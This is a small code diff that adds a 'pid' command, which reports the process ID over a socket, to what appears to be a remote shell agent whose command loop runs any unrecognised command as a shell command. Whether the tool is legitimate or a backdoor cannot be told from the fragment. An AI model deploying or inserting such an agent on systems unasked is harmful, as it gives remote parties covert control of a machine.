@@ -46,6 +46,11 @@ def pwd(cmd_data):
 	sock.send(cmd_data['term'])	
 
 
+def pid(cmd_data):
+	sock.send(str(os.getpid()))
+	sock.send(cmd_data['term'])	
+
+
 def list_dir(cmd_data):
 	path = cmd_data['args']
 	results = dict()
@@ -146,6 +151,8 @@ while 1:
 		tab_complete(cmd_data)
 	elif cmd == "pwd":
 		pwd(cmd_data)
+	elif cmd == "pid":
+		pid(cmd_data)
 	else:
 		run_shell_command(cmd_data)
 
